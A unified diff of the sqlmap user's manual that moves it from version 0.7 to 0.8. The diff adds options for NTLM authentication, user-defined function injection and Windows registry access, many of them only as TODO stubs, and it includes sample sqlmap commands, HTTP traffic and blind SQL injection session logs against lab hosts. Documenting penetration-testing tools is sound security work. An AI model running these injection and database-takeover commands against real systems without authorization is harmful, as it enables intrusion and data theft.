@@ -3,8 +3,8 @@
 <article>
 
 <title>sqlmap user's manual
-<author>by <htmlurl url="mailto:bernardo.damele@gmail.com" name="Bernardo Damele A. G.">
-<date>version 0.7, July 25, 2009
+<author>by <htmlurl url="mailto:bernardo.damele@gmail.com" name="Bernardo Damele A. G.">, <htmlurl url="mailto:miroslav.stampar@gmail.com" name="Miroslav Stampar">
+<date>version 0.8, March 01, 2010
 <abstract>
 This document is the user's manual to use <htmlurl url="http://sqlmap.sourceforge.net" name="sqlmap">.
 Check the project <htmlurl url="http://sqlmap.sourceforge.net" name="homepage">
@@ -354,24 +354,24 @@ sqlmap can be downloaded from its
 It is available in various formats:
 
 <itemize>
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7.tar.gz"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.8.tar.gz"
 name="Source gzip compressed"> operating system independent.
 
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7.tar.bz2"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.8.tar.bz2"
 name="Source bzip2 compressed"> operating system independent.
 
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7.zip"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.8.zip"
 name="Source zip compressed"> operating system independent.
 
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap_0.7-1_all.deb"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap_0.8-1_all.deb"
 name="DEB binary package"> architecture independent for Debian and any
 other Debian derivated GNU/Linux distribution.
 
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7-1.noarch.rpm"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.8-1.noarch.rpm"
 name="RPM binary package"> architecture independent for Fedora and any
 other operating system that can install RPM packages.
 
-<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.7_exe.zip"
+<item><htmlurl url="http://downloads.sourceforge.net/sqlmap/sqlmap-0.8_exe.zip"
 name="Portable executable for Windows"> that <bf>does not require the Python
 interpreter</bf> to be installed on the operating system.
 </itemize>
@@ -403,8 +403,8 @@ sqlmap is copyrighted by
 <tscreen><verb>
 $ python sqlmap.py -h
 
-    sqlmap/0.7
-    by Bernardo Damele A. G. <bernardo.damele@gmail.com>
+    sqlmap/0.8 - automatic SQL injection and database takeover tool
+    http://sqlmap.sourceforge.net
     
 Usage: sqlmap.py [options]
 
@@ -418,7 +418,8 @@ Options:
     get target urls from.
 
     -u URL, --url=URL   Target url
-    -l LIST             Parse targets from Burp or WebScarab logs
+    -l LIST             Parse targets from Burp or WebScarab proxy logs
+    -r REQUESTFILE      Load HTTP request from a file
     -g GOOGLEDORK       Process Google dork results as target urls
     -c CONFIGFILE       Load options from a configuration INI file
 
@@ -428,17 +429,22 @@ Options:
     --method=METHOD     HTTP method, GET or POST (default GET)
     --data=DATA         Data string to be sent through POST
     --cookie=COOKIE     HTTP Cookie header
-    --referer=REFERER   HTTP Referer header
+    --cookie-urlencode  URL-encode generated cookie injections
+    --drop-set-cookie   Ignore Set-Cookie header from response
     --user-agent=AGENT  HTTP User-Agent header
     -a USERAGENTSFILE   Load a random HTTP User-Agent header from file
+    --referer=REFERER   HTTP Referer header
     --headers=HEADERS   Extra HTTP headers newline separated
-    --auth-type=ATYPE   HTTP Authentication type (value Basic or Digest)
-    --auth-cred=ACRED   HTTP Authentication credentials (value name:password)
+    --auth-type=ATYPE   HTTP Authentication type (Basic, Digest or NTLM)
+    --auth-cred=ACRED   HTTP Authentication credentials (name:password)
+    --auth-cert=ACERT   HTTPs Authentication certificate (key_file,cert_file)
     --proxy=PROXY       Use a HTTP proxy to connect to the target url
     --threads=THREADS   Maximum number of concurrent HTTP requests (default 1)
     --delay=DELAY       Delay in seconds between each HTTP request
     --timeout=TIMEOUT   Seconds to wait before timeout connection (default 30)
     --retries=RETRIES   Retries when the connection timeouts (default 3)
+    --scope=SCOPE       Regexp to filter targets from provided proxy log
+    --ignore-proxy      Ignore system default HTTP proxy
 
   Injection:
     These options can be used to specify which parameters to test for,
@@ -495,8 +501,16 @@ Options:
     --exclude-sysdbs    Exclude DBMS system databases when enumerating tables
     --start=LIMITSTART  First query output entry to retrieve
     --stop=LIMITSTOP    Last query output entry to retrieve
+    --first=FIRSTCHAR   First query output word character to retrieve
+    --last=LASTCHAR     Last query output word character to retrieve
     --sql-query=QUERY   SQL statement to be executed
     --sql-shell         Prompt for an interactive SQL shell
+
+  User-defined function injection:
+    These options can be used to create custom user-defined functions.
+
+    --udf-inject        Inject custom user-defined functions
+    --shared-lib=SHLIB  Local path of the shared library
 
   File system access:
     These options can be used to access the back-end database management
@@ -519,10 +533,23 @@ Options:
     --msf-path=MSFPATH  Local path where Metasploit Framework 3 is installed
     --tmp-path=TMPPATH  Remote absolute path of temporary files directory
 
+  Windows registry access:
+    This option can be used to access the back-end database management
+    system Windows registry.
+
+    --reg-read          Read a Windows registry key value
+    --reg-add           Write a Windows registry key value data
+    --reg-del           Delete a Windows registry key value
+    --reg-key=REGKEY    Windows registry key
+    --reg-value=REGVAL  Windows registry key value
+    --reg-data=REGDATA  Windows registry key value data
+    --reg-type=REGTYPE  Windows registry key value type
+
   Miscellaneous:
-    --eta               Display for each output the estimated time of arrival
-    --update            Update sqlmap to the latest stable version
     -s SESSIONFILE      Save and resume all data retrieved on a session file
+    --eta               Display for each output the estimated time of arrival
+    --gpage=GOOGLEPAGE  Use google dork results from specified page number
+    --update            Update Microsoft SQL Server XML signature file
     --save              Save options on a configuration INI file
     --batch             Never ask for user input, use the default behaviour
     --cleanup           Clean up the DBMS by sqlmap specific UDF and tables
@@ -622,7 +649,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 [hh:mm:55] [INFO] testing MySQL
@@ -635,7 +662,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 </verb></tscreen>
@@ -655,7 +682,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:44] [TRAFFIC IN] HTTP response (OK - 200):
@@ -676,7 +703,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 </verb></tscreen>
@@ -696,7 +723,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:17] [TRAFFIC IN] HTTP response (OK - 200):
@@ -724,7 +751,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:18] [TRAFFIC IN] HTTP response (OK - 200):
@@ -835,6 +862,13 @@ web application technology: PHP 5.2.6, Apache 2.2.9
 back-end DBMS: MySQL >= 5.0.0
 [...]
 </verb></tscreen>
+
+
+<sect2>Load HTTP request from a file
+
+<p>
+Option: <tt>-r</tt>
+#TODO
 
 
 <sect2>Process Google dork results as target urls
@@ -1034,7 +1068,7 @@ Host: 192.168.1.125:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
 Cookie: ASPSESSIONIDSABTRCAS=HPCBGONANJBGFJFHGOKDMCGJ
 Connection: close
 
@@ -1050,7 +1084,7 @@ Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
 Cookie: ASPSESSIONIDSABTRCAS=469
-User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:40] [WARNING] Cookie parameter 'ASPSESSIONIDSABTRCAS' is not dynamic
@@ -1074,37 +1108,18 @@ values that you provided? [Y/n]
 </verb></tscreen>
 
 
-<sect2>HTTP <tt>Referer</tt> header
+<sect2>URL-encode generated cookie injections
 
 <p>
-Option: <tt>-</tt><tt>-referer</tt>
+Option: <tt>-</tt><tt>-cookie-urlencode</tt>
+#TODO
+
+
+<sect2>Ignore <tt>Set-Cookie</tt> header from response
 
 <p>
-It is possible to fake the HTTP <tt>Referer</tt> header value with this
-option. By default no HTTP <tt>Referer</tt> header is sent in HTTP
-requests.
-
-<p>
-Example on a <bf>PostgreSQL 8.3.5</bf> target:
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --referer \
-  "http://www.google.com" -v 3
-
-[...]
-[hh:mm:48] [INFO] testing connection to the target url
-[hh:mm:48] [TRAFFIC OUT] HTTP request:
-GET /sqlmap/mysql/get_int.php?id=1 HTTP/1.1
-Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
-Host: 192.168.1.121:80
-Accept-language: en-us,en;q=0.5
-Referer: http://www.google.com
-Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
-image/png,*/*;q=0.5
-User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
-Connection: close
-[...]
-</verb></tscreen>
+Option: <tt>-</tt><tt>-drop-set-cookie</tt>
+#TODO
 
 
 <sect2>HTTP <tt>User-Agent</tt> header
@@ -1117,7 +1132,7 @@ By default sqlmap perform HTTP requests providing the following HTTP
 <tt>User-Agent</tt> header value:
 
 <tscreen><verb>
-sqlmap/0.7 (http://sqlmap.sourceforge.net)
+sqlmap/0.8 (http://sqlmap.sourceforge.net)
 </verb></tscreen>
 
 <p>
@@ -1197,6 +1212,39 @@ to force the HTTP User-Agent header with option --user-agent or -a
 </verb></tscreen>
 
 
+<sect2>HTTP <tt>Referer</tt> header
+
+<p>
+Option: <tt>-</tt><tt>-referer</tt>
+
+<p>
+It is possible to fake the HTTP <tt>Referer</tt> header value with this
+option. By default no HTTP <tt>Referer</tt> header is sent in HTTP
+requests.
+
+<p>
+Example on a <bf>PostgreSQL 8.3.5</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" --referer \
+  "http://www.google.com" -v 3
+
+[...]
+[hh:mm:48] [INFO] testing connection to the target url
+[hh:mm:48] [TRAFFIC OUT] HTTP request:
+GET /sqlmap/mysql/get_int.php?id=1 HTTP/1.1
+Accept-charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7
+Host: 192.168.1.121:80
+Accept-language: en-us,en;q=0.5
+Referer: http://www.google.com
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
+image/png,*/*;q=0.5
+User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
+Connection: close
+[...]
+</verb></tscreen>
+
+
 <sect2>Extra HTTP headers
 
 <p>
@@ -1209,16 +1257,16 @@ to provide them from the configuration INI file. Have a look at the sample
 <tt>sqlmap.conf</tt> file.
 
 
-<sect2>HTTP <tt>Basic</tt> and <tt>Digest</tt> authentications
+<sect2>HTTP <tt>Basic</tt>, <tt>Digest</tt> and <tt>NTLM</tt> authentications
 
 <p>
 Options: <tt>-</tt><tt>-auth-type</tt> and <tt>-</tt><tt>-auth-cred</tt>
 
 <p>
 These options can be used to specify which HTTP authentication type the
-web server implements and the valid credentials to be used to perfom all
-HTTP requests to the target URL.
-The two valid types are <tt>Basic</tt> and <tt>Digest</tt> and the
+web server implements and the valid credentials to be used 
+to perfom all HTTP requests to the target URL.
+The three valid types are <tt>Basic</tt>, <tt>Digest</tt> and <tt>NTLM</tt>, while the
 credentials' syntax is <tt>username:password</tt>.
 
 <p>
@@ -1238,7 +1286,7 @@ Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
 Authorization: Basic dGVzdHVzZXI6dGVzdHBhc3M=
-User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 
@@ -1259,10 +1307,17 @@ Authorization: Digest username="testuser", realm="Testing digest authentication"
 nonce="Qw52C8RdBAA=2d7eb362292b24718dcb6e4d9a7bf0f13d58fa9d", 
 uri="/sqlmap/mysql/digest/get_int.php?id=1", response="16d01b08ff2f77d8ff0183d706f96747", 
 algorithm="MD5", qop=auth, nc=00000001, cnonce="579be5eb8753693a"
-User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 </verb></tscreen>
+
+
+<sect2>HTTPs authentication with certificate
+
+<p>
+Option: <tt>-</tt><tt>-auth-cert</tt>
+#TODO
 
 
 <sect2>HTTP proxy
@@ -1385,6 +1440,20 @@ It is possible to specify the maximum number of retries when the HTTP
 connection timeouts. By default it retries up to three times.
 
 
+<sect2>Filtering targets from provided proxy log using regular expression
+
+<p>
+Option: <tt>-</tt><tt>-scope</tt>
+#TODO
+
+
+<sect2>Ignoring system default HTTP proxy
+
+<p>
+Option: <tt>-</tt><tt>-ignore-proxy</tt>
+#TODO
+
+
 <sect1>Injection
 
 <p>
@@ -1442,7 +1511,7 @@ Example on a <bf>MySQL 5.0.67</bf> target:
 
 <tscreen><verb>
 $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/ua_str.php" -v 1 \
-  -p "user-agent" --user-agent "sqlmap/0.7 (http://sqlmap.sourceforge.net)"
+  -p "user-agent" --user-agent "sqlmap/0.8 (http://sqlmap.sourceforge.net)"
 
 [hh:mm:40] [WARNING] the testable parameter 'user-agent' you provided is not into the GET
 [hh:mm:40] [INFO] testing connection to the target url
@@ -1587,7 +1656,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
 Connection: close
 [...]
 [hh:mm:17] [INFO] GET parameter 'id' is custom injectable 
@@ -1659,7 +1728,7 @@ $ python sqlmap.py -u "http://192.168.1.121/sqlmap/mysql/get_int_refresh.php?id=
 [hh:mm:50] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int_refresh.php?id=1 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:50] [TRAFFIC IN] HTTP response (OK - 200):
@@ -1681,7 +1750,7 @@ Content-Type: text/html
 [hh:mm:51] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int_refresh.php?id=1 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:51] [TRAFFIC IN] HTTP response (OK - 200):
@@ -1703,7 +1772,7 @@ Content-Type: text/html
 [hh:mm:51] [TRAFFIC OUT] HTTP request:
 GET /sqlmap/mysql/get_int_refresh.php?id=1 HTTP/1.1
 Host: 192.168.1.121:80
-User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:51] [TRAFFIC IN] HTTP response (OK - 200):
@@ -2130,7 +2199,7 @@ Host: 192.168.1.121:80
 Accept-language: en-us,en;q=0.5
 Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,
 image/png,*/*;q=0.5
-User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:29] [TRAFFIC IN] HTTP response (OK - 200):
@@ -3176,7 +3245,8 @@ Table: users
 
 <p>
 Options: <tt>-</tt><tt>-dump</tt>, <tt>-C</tt>, <tt>-T</tt>, <tt>-D</tt>,
-<tt>-</tt><tt>-start</tt> and <tt>-</tt><tt>-stop</tt>
+<tt>-</tt><tt>-start</tt>, <tt>-</tt><tt>-stop</tt>, <tt>-</tt><tt>-first</tt>
+and <tt>-</tt><tt>-last</tt>
 
 <p>
 It is possible to dump the entries for a specific database table.
@@ -3217,7 +3287,7 @@ Table: users
 | 1  | luther                                       | blissett          |
 | 2  | fluffy                                       | bunny             |
 | 3  | wu                                           | ming              |
-| 4  | sqlmap/0.7 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.8 (http://sqlmap.sourceforge.net) | user agent header |
 | 5  | NULL                                         | nameisnull        |
 +----+----------------------------------------------+-------------------+
 </verb></tscreen>
@@ -3269,7 +3339,7 @@ Table: users
 | 1  | luther                                       | blissett          |
 | 2  | fluffy                                       | bunny             |
 | 3  | wu                                           | ming              |
-| 4  | sqlmap/0.7 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.8 (http://sqlmap.sourceforge.net) | user agent header |
 | 5  |                                              | nameisnull        |
 +----+----------------------------------------------+-------------------+
 
@@ -3282,13 +3352,15 @@ $ cat /software/sqlmap/output/192.168.1.121/dump/public/users.csv
 "1","luther","blissett"
 "2","fluffy","bunny"
 "3","wu","ming"
-"4","sqlmap/0.7 (http://sqlmap.sourceforge.net)","user agent header"
+"4","sqlmap/0.8 (http://sqlmap.sourceforge.net)","user agent header"
 "5","","nameisnull"
 </verb></tscreen>
 
 <p>
 You can also provide the <tt>-</tt><tt>-start</tt> and/or the <tt>-</tt><tt>-stop</tt>
-options to limit the dump to a range of entries.
+options to limit the dump to a range of entries, while those entries can be further limited
+to a range of character positions provided with <tt>-</tt><tt>-first</tt> and/or the 
+<tt>-</tt><tt>-last</tt> options.
 
 <itemize>
 <item><tt>-</tt><tt>-start</tt> specifies the first entry to enumerate
@@ -3310,7 +3382,7 @@ Table: users
 +----+----------------------------------------------+-------------------+
 | 2  | fluffy                                       | bunny             |
 | 3  | wu                                           | ming              |
-| 4  | sqlmap/0.7 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.8 (http://sqlmap.sourceforge.net) | user agent header |
 +----+----------------------------------------------+-------------------+
 </verb></tscreen>
 
@@ -3342,7 +3414,7 @@ Table: users
 | 1  | luther                                       | blissett          |
 | 2  | fluffy                                       | bunny             |
 | 3  | wu                                           | ming              |
-| 4  | sqlmap/0.7 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.8 (http://sqlmap.sourceforge.net) | user agent header |
 | 5  | NULL                                         | nameisnull        |
 +----+----------------------------------------------+-------------------+
 
@@ -3431,7 +3503,7 @@ Table: users
 +----+----------------------------------------------+-------------------+
 | id | name                                         | surname           |
 +----+----------------------------------------------+-------------------+
-| 4  | sqlmap/0.7 (http://sqlmap.sourceforge.net) | user agent header |
+| 4  | sqlmap/0.8 (http://sqlmap.sourceforge.net) | user agent header |
 | 2  | fluffy                                       | bunny             |
 | 1  | luther                                       | blisset           |
 | 3  | wu                                           | ming              |
@@ -3828,6 +3900,22 @@ Beware that some web application technologies do not support stacked
 queries on specific database management systems. For instance, PHP does not
 support stacked queries when the back-end DBMS is MySQL, but it does
 support when the back-end DBMS is PostgreSQL.
+
+
+<sect1>User-defined function injection
+
+<sect2>Inject custom user-injection functions
+
+<p>
+Option: <tt>-</tt><tt>-udf-inject</tt>
+#TODO
+
+
+<sect2>Local path of the shared library
+
+<p>
+Option: <tt>-</tt><tt>-shared-lib</tt>
+#TODO
 
 
 <sect1>File system access
@@ -4858,7 +4946,154 @@ meterpreter > exit
 </verb></tscreen>
 
 
+<sect1>Windows registry access
+
+<sect2>Read a Windows registry key value
+
+<p>
+Option: <tt>-</tt><tt>-reg-read</tt>
+#TODO
+
+
+<sect2>Write a Windows registry key value data
+
+<p>
+Option: <tt>-</tt><tt>-reg-add</tt>
+#TODO
+
+
+<sect2>Delete a Windows registry key value
+
+<p>
+Option: <tt>-</tt><tt>-reg-del</tt>
+#TODO
+
+
+<sect2>Windows registry key
+
+<p>
+Option: <tt>-</tt><tt>-reg-key</tt>
+#TODO
+
+
+<sect2>Windows registry key value
+
+<p>
+Option: <tt>-</tt><tt>-reg-value</tt>
+#TODO
+
+
+<sect2>Windows registry key value data
+
+<p>
+Option: <tt>-</tt><tt>-reg-data</tt>
+#TODO
+
+
+<sect2>Windows registry key value type
+
+<p>
+Option: <tt>-</tt><tt>-reg-type</tt>
+#TODO
+
+
 <sect1>Miscellaneous
+
+<sect2>Save and resume all data retrieved on a session file
+
+<p>
+Option: <tt>-s</tt>
+
+<p>
+It is possible to log all queries and their output into a text file while
+performing whatever request, both in blind SQL injection and in inband SQL
+injection.
+This is useful if you stop the injection and resume it after some time.
+
+<p>
+Example on a <bf>PostgreSQL 8.3.5</bf> target:
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -b \
+  -v 1 -s "sqlmap.log"
+
+[...]
+back-end DBMS:  PostgreSQL
+[hh:mm:02] [INFO] query: VERSION()
+[hh:mm:02] [INFO] retrieved: PostgreSQL 8.3.5 on i486-pc-^C
+[hh:mm:03] [ERROR] user aborted
+</verb></tscreen>
+
+<p>
+As you can see, I stopped the injection with <tt>CTRL-C</tt> while
+retrieving the PostgreSQL banner and logged the session to text file
+<tt>sqlmap.log</tt>.
+
+<tscreen><verb>
+$ cat sqlmap.log
+
+[hh:mm:00 MM/DD/YY]
+[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][Injection point][GET]
+[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][Injection parameter][id]
+[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][Injection type][numeric]
+[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][Parenthesis][0]
+[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][CONCAT('9', '9')][]
+[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][LENGTH(SYSDATE)][]
+[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][COALESCE(3, NULL)][3]
+[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][LENGTH('3')][1]
+[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][DBMS][PostgreSQL]
+[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][VERSION()][PostgreSQL 8.3.5 
+on i486-pc-
+</verb></tscreen>
+
+<p>
+As you can see, all queries performed and their output have been logged to
+the session file in real time while performing the injection.
+
+<p>
+The session file has a structure as follows:
+
+<tscreen><verb>
+[hh:mm:ss MM/DD/YY]
+[Target URL][Injection point][Parameters][Query or information name][Query output or value]
+</verb></tscreen>
+
+<p>
+Performing the same request now, sqlmap resumes all information already
+retrieved then calculates the query length, in the example
+<tt>VERSION()</tt>, and resumes the injection from the last character
+retrieved to the end of the query output.
+
+<tscreen><verb>
+$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -b \
+  -v 1 -s "sqlmap.log"
+
+[...]
+[hh:mm:03] [INFO] resuming injection point 'GET' from session file
+[hh:mm:03] [INFO] resuming injection parameter 'id' from session file
+[hh:mm:03] [INFO] resuming injection type 'numeric' from session file
+[hh:mm:03] [INFO] resuming 0 number of parenthesis from session file
+[hh:mm:03] [INFO] resuming back-end DBMS 'PostgreSQL' from session file
+[hh:mm:03] [INFO] testing connection to the target url
+[hh:mm:03] [INFO] testing for parenthesis on injectable parameter
+[hh:mm:03] [INFO] retrieving the length of query output
+[hh:mm:03] [INFO] query: LENGTH(VERSION())
+[hh:mm:03] [INFO] retrieved: 98
+[hh:mm:03] [INFO] resumed from file 'sqlmap.log': PostgreSQL 8.3.5 on i486-pc-...
+[hh:mm:03] [INFO] retrieving pending 70 query output characters
+[hh:mm:03] [INFO] query: SUBSTR((VERSION())::text, 29, 98)
+[hh:mm:03] [INFO] retrieved: linux-gnu, compiled by GCC gcc-4.3.real 
+(Ubuntu 4.3.2-1ubuntu11) 4.3.2
+web server operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
+web application technology: PHP 5.2.6, Apache 2.2.9
+back-end DBMS operating system: Linux Ubuntu 8.10 (Intrepid Ibex)
+back-end DBMS: PostgreSQL
+
+[hh:mm:07] [INFO] fetching banner
+banner:    'PostgreSQL 8.3.5 on i486-pc-linux-gnu, compiled by GCC gcc-4.3.real 
+(Ubuntu 4.3.2-1ubuntu11) 4.3.2'
+</verb></tscreen>
+
 
 <sect2>Estimated time of arrival
 
@@ -4944,10 +5179,18 @@ then estimates the time of arrival, shows the progress in percentage and
 counts the number of retrieved query output characters.
 
 
-<sect2>Update sqlmap to the latest stable version
+<sect2>Use google dork results from specified page number
+
+<p>
+Option: <tt>-</tt><tt>-gpage</tt>
+#TODO
+
+
+<sect2>Update Microsoft SQL Server XML signature file
 
 <p>
 Option: <tt>-</tt><tt>-update</tt>
+#TODO
 
 <p>
 
@@ -4969,7 +5212,7 @@ $ python sqlmap.py --update -v 4
 [hh:mm:55] [TRAFFIC OUT] HTTP request:
 GET /doc/VERSION HTTP/1.1
 Host: sqlmap.sourceforge.net
-User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
 Connection: close
 
 [hh:mm:55] [TRAFFIC IN] HTTP response (OK - 200):
@@ -4988,7 +5231,7 @@ X-Pad: avoid browser bug
 [hh:mm:56] [TRAFFIC OUT] HTTP request:
 GET /FAQs/SQLServerVersionDatabase/tabid/63/Default.aspx HTTP/1.1
 Host: www.sqlsecurity.com
-User-agent: sqlmap/0.7 (http://sqlmap.sourceforge.net)
+User-agent: sqlmap/0.8 (http://sqlmap.sourceforge.net)
 Cookie: .ASPXANONYMOUS=dvus03cqyQEkAAAANDI0M2QzZmUtOGRkOS00ZDQxLThhMTUtN2ExMWJiNWVjN2My0; 
 language=en-US
 Connection: close
@@ -5021,102 +5264,6 @@ name="SQLSecurity.com site">.
 Note that the default configuration file <tt>sqlmap.conf</tt> is backupped
 to <tt>sqlmap.conf.bak</tt> each time a new stable version is available and
 your copy is outdated.
-
-
-<sect2>Save and resume all data retrieved on a session file
-
-<p>
-Option: <tt>-s</tt>
-
-<p>
-It is possible to log all queries and their output into a text file while
-performing whatever request, both in blind SQL injection and in inband SQL
-injection.
-This is useful if you stop the injection and resume it after some time.
-
-<p>
-Example on a <bf>PostgreSQL 8.3.5</bf> target:
-
-<tscreen><verb>
-$ python sqlmap.py -u "http://192.168.1.121/sqlmap/pgsql/get_int.php?id=1" -b \
-  -v 1 -s "sqlmap.log"
-
-[...]
-back-end DBMS:	PostgreSQL
-[hh:mm:02] [INFO] query: VERSION()
-[hh:mm:02] [INFO] retrieved: PostgreSQL 8.3.5 on i486-pc-^C
-[hh:mm:03] [ERROR] user aborted
-</verb></tscreen>
-
-<p>
-As you can see, I stopped the injection with <tt>CTRL-C</tt> while
-retrieving the PostgreSQL banner and logged the session to text file
-<tt>sqlmap.log</tt>.
-
-<tscreen><verb>
-$ cat sqlmap.log
-
-[hh:mm:00 MM/DD/YY]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][Injection point][GET]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][Injection parameter][id]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][Injection type][numeric]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][Parenthesis][0]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][CONCAT('9', '9')][]
-[http://192.168.1.121:80/sqlmap/pgsql/get_int.php][GET][id=1][LENGTH(SYSDATE)][]
